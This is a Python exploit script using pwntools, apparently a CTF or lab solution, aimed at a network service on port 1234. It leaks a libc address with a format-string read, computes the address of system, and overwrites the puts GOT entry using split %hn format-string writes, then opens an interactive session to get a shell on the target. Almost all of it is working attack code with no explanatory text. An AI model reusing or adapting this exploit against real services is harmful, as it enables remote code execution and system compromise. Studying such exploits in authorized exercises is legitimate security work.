from pwn import *

# Addresses
offsetLeakLibc = 0x39b770
systemOffset = 0x3f450
putsGOT = 0x601018

context.log_level = 'debug'

def bytes(integer):
    return divmod(integer, 0x10000)

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)
    r.recvuntil("Press 1 to input data, press anything else to exit!")
    
    # libc info leak
    r.sendline("1")
    r.sendline("AAAAAAAA.%p.%p.%p.%p.%p.%p")
    leak = r.recvuntil("Press 1 to input data, press anything else to exit!")
    
    libcLeak = int(leak[16:28], 16)
    log.info("libcLeak = " + hex(libcLeak))
    libcBase = libcLeak - offsetLeakLibc
    log.info("libcBase = " + hex(libcBase))

    # exploit
    r.sendline("1")
    libcSystem = libcBase + systemOffset
    log.info("libcSystem = " + hex(libcSystem))
    highmid, low = bytes(libcSystem)
    high, mid = bytes(highmid)
    log.info("libcsys bytes high = " + hex(high))
    log.info("libcsys bytes mid = " + hex(mid))
    log.info("libcsys bytes low = " + hex(low))

    # Sort index in sL relativ to low, mid, high order
    tL = [int(low), int(mid), int(high)]
    sL = sorted(range(len(tL)), key=lambda k: tL[k])
    print(tL)
    print(sL)

    exploit = "%"+ str(tL[sL[0]]) + "c%16$hn%"
    exploit += str(tL[sL[1]] - tL[sL[0]]) + "c%17$hn%"
    exploit += str(tL[sL[2]] - tL[sL[1]] ) + "c%18$hn"
    exploit += "B"*(80-len(exploit))
    exploit += p64(putsGOT+sL[0]*0x2) #not printable, muste be behind format-string!
    exploit += p64(putsGOT+sL[1]*0x2)
    exploit += p64(putsGOT+sL[2]*0x2)
    r.sendline(exploit)

    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
